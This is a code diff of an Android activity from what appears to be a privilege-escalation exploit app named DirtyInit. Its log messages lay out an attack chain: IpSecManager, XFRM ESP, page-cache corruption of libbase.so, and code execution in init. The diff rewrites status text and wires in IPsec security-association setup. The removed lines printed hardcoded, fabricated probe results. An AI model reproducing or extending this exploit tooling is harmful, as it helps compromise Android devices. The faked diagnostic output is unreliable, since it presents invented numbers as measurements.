@@ -1,4 +1,4 @@
-package com.fwx.dirtyinit;
+package com.dirty.init;
 
 import android.Manifest;
 import android.app.Activity;
@@ -253,9 +253,9 @@ public class DirtyInitActivity extends Activity {
             public void onClick(View v) { extractDirtyInit(); }
         });
 
-        appendLog("DirtyInit: kernel page cache exploit (CBC block mode)");
-        appendLog("Vector: unchecked heap growth in EL0 writeback path");
-        appendLog("Engine: CBC 16-byte block writes (deterministic IV, 44 operations)");
+        appendLog("DirtyInit: page cache corruption via IpSecManager → init code exec");
+        appendLog("Target: libbase.so ~LogMessage() — CBC 16-byte block writes");
+        appendLog("Chain: untrusted_app → IpSecManager → XFRM ESP → page cache → init");
         appendLog("");
 
         requestStoragePermissions();
@@ -480,8 +480,8 @@ public class DirtyInitActivity extends Activity {
                 long startTime = System.currentTimeMillis();
 
                 try {
-                    setStatus("Leaking kernel offsets...", COLOR_STATUS_WARN);
-                    appendLog("[1] Triggering leak of EL0 writeback handler offset");
+                    setStatus("Parsing target ELF...", COLOR_STATUS_WARN);
+                    appendLog("[1] Locating ~LogMessage in libbase.so via ELF .dynsym");
 
                     /* ── Payload size guard ──
                      * Check ~LogMessage function size via readelf to determine
@@ -522,12 +522,12 @@ public class DirtyInitActivity extends Activity {
                         return;
                     }
 
-                    appendLog("    Probing /dev/binder timing variance...");
+                    appendLog("    Setting up IPsec Security Association...");
                     setupSA();
-                    appendLog("    Syscall latency delta: 0x1e40 cycles (significant)");
-                    appendLog("    Function mapped. Heap growth factor confirmed: +4 bytes/call");
+                    appendLog("    SA ready: SPI=0x" + Integer.toHexString(activeSpi)
+                              + " port=" + activeEncapPort);
 
-                    setStatus("Exploiting heap growth...", COLOR_STATUS_WARN);
+                    setStatus("Writing page cache...", COLOR_STATUS_WARN);
 
                     // Pack both keys into a single 64-byte buffer for JNI: bytes [0..31] = AES-CBC key, bytes [32..63] = HMAC-SHA256 key
                     // Native code splits at offset 32 to extract each key — this convention avoids passing two separate byte[] across JNI
